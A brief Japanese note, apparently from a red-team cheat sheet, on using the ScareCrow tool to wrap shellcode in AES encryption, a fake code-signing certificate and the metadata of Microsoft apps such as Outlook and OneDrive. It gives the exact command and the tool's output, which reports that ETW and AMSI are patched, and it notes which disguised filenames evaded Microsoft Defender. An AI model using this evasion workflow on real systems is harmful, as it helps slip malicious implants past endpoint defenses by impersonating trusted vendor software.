シェルコードに対して偽物の署名をしたり、暗号化したりして静的解析の回避に使う
実行ファイルを出力する際にOutlook, Excel, cmdといったマイクロソフト製アプリのプロパティを参考にしているようで、バリエーションがある。
なのでOneDrive.exeは捕まらなかったのに、Outlook.exeは捕まったみたいなことが起こるのでいろいろ出力すると良い
現状Defender回避したファイル: OneDrive.exe...
```sh
cd /opt/ScareCrow

sudo ./ScareCrow -I /tmp/agent.bin -domain www.microsoft.com -encryptionmode AES

#   _________                           _________                       
#  /   _____/ ____ _____ _______   ____ \_   ___ \_______  ______  _  __
#  \_____  \_/ ___\\__  \\_  __ \_/ __ \/    \  \/\_  __ \/  _ \ \/ \/ /
#  /        \  \___ / __ \|  | \/\  ___/\     \____|  | \(  <_> )     / 
# /_______  /\___  >____  /__|    \___  >\______  /|__|   \____/ \/\_/  
# 	\/     \/     \/            \/        \/                      
#							(@Tyl0us)
#	“Fear, you must understand is more than a mere obstacle. 
#	Fear is a TEACHER. the first one you ever had.”
#	
# [+] Shellcode Encrypted
# [+] Patched ETW Enabled
# [+] Patched AMSI Enabled
# [+] Sleep Timer set for 2542 milliseconds 
# [*] Creating an Embedded Resource File
# [+] Created Embedded Resource File With Outlook's Properties
# [*] Compiling Payload
# [+] Payload Compiled
# [*] Signing Outlook.exe With a Fake Cert
# [+] Signed File Created
# [+] Binary Compiled
#[!] Sha256 hash of Outlook.exe: 549f5152e885a1e2cb352271da2cfdbdac1f5b9e9aad86871cbb2062402d15b4


```